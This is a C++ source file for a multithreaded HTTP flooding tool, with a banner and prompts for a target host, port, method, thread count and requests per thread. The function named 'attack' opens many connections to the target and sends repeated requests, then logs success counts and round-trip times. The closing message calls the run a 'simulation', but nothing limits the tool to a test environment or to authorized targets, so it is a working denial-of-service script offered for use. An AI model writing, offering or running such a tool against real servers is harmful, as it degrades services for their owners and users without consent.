#include <iostream>
#include <fstream>
#include <sstream>
#include <thread>
#include <vector>
#include <chrono>
#include <cstdlib>
#include <cstring>
#include <ctime>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <netdb.h>

using namespace std;
using namespace chrono;

#define RED     "\033[1;31m"
#define GREEN   "\033[1;32m"
#define CYAN    "\033[1;36m"
#define RESET   "\033[0m"

string generate_header() {
    vector<string> headers = {
        "User-Agent: Mozilla/5.0",
        "Accept: */*",
        "Cache-Control: no-cache",
        "Accept-Encoding: gzip",
        "Connection: close"
    };
    ostringstream h;
    for (auto& s : headers) h << s << "\r\n";
    return h.str();
}

string resolve_domain(const string& host) {
    hostent* he = gethostbyname(host.c_str());
    if (he && he->h_addr_list[0])
        return inet_ntoa(*(struct in_addr*)he->h_addr_list[0]);
    return host;
}

void attack(string ip, int port, string method, int id, int count, ofstream& log) {
    int success = 0;
    double total_rtt = 0;

    for (int i = 0; i < count; i++) {
        int sock = socket(AF_INET, SOCK_STREAM, 0);
        sockaddr_in server{};
        server.sin_family = AF_INET;
        server.sin_port = htons(port);
        inet_pton(AF_INET, ip.c_str(), &server.sin_addr);

        auto start = high_resolution_clock::now();
        if (connect(sock, (sockaddr*)&server, sizeof(server)) >= 0) {
            string req = method + " / HTTP/1.1\r\nHost: " + ip + "\r\n" + generate_header() + "\r\n";
            send(sock, req.c_str(), req.size(), 0);

            char buffer[1024];
            int r = recv(sock, buffer, sizeof(buffer)-1, 0);
            if (r > 0) {
                buffer[r] = 0;
                string line(buffer);
                size_t pos = line.find("\r\n");
                line = (pos != string::npos) ? line.substr(0, pos) : line;
                cout << GREEN << "[T" << id << "] Response: " << line << RESET << endl;
            }
            success++;
        }
        auto end = high_resolution_clock::now();
        total_rtt += duration_cast<milliseconds>(end - start).count();
        close(sock);
    }

    double avg_rtt = (count > 0) ? total_rtt / count : 0;
    log << "[Thread " << id << "] Success: " << success << ", Avg RTT: " << avg_rtt << "ms\n";
    cout << CYAN << "[Thread " << id << "] Completed. Success: " << success << ", Avg RTT: " << avg_rtt << "ms" << RESET << endl;
}

int main() {
    srand(time(0));
    string target, method;
    int port, threads, per_thread;

    cout << CYAN << R"(
 __/\\\\\\\\\\\\\\_________/\\\\\\\\\\___________/\\\\\\\\\\\\\\_____/\\\\\\\\\\____        
  _\\/\\\/////////\\\_____/\\\///////\\\_________\\/\\\//////////____/\\\///////\\\__       
   _\\/\\\_______\\/\\\___\\/\\\_____\\/\\\________\\/\\\_____________\\/\\\_____\\/\\\__      
    _\\/\\\\\\\\\\\\\\/___\\/\\\\\\\\\\\\\\_________\\/\\\\\\\\\\\\\\__\\/\\\\\\\\\\\/__     
     _\\/\\\/////////_____\//\\\///////\\\__________\\/\\\///////____\\//\\\///////____    
      _\\/\\\______________\\///\\\___///\\\__________\\/\\\_____________\\//\\\_________   
       _\\/\\\______________\\////\\\\\\\\\\___________\\/\\\______________\\///\\\\\\\\\\\\\\_  
        _\\///__________________\\///////_____________\\///_________________\\//////////__  
    )" << RESET;

    cout << CYAN << "[+] Target IP or Domain: " << RESET; cin >> target;
    cout << CYAN << "[+] Port: " << RESET; cin >> port;
    cout << CYAN << "[+] Method (GET/POST/HEAD): " << RESET; cin >> method;
    cout << CYAN << "[+] Threads: " << RESET; cin >> threads;
    cout << CYAN << "[+] Requests per thread: " << RESET; cin >> per_thread;

    string ip = resolve_domain(target);
    cout << "\033[1;33m[*] Resolved IP: " << ip << "\033[0m" << endl;

    ofstream log("attack_metrics.log");
    vector<thread> pool;
    for (int i = 0; i < threads; ++i)
        pool.emplace_back(attack, ip, port, method, i + 1, per_thread, ref(log));

    for (auto& t : pool) t.join();
    log.close();

    cout << GREEN << "[+] Attack simulation complete. Metrics saved to attack_metrics.log" << RESET << endl;
    return 0;
}
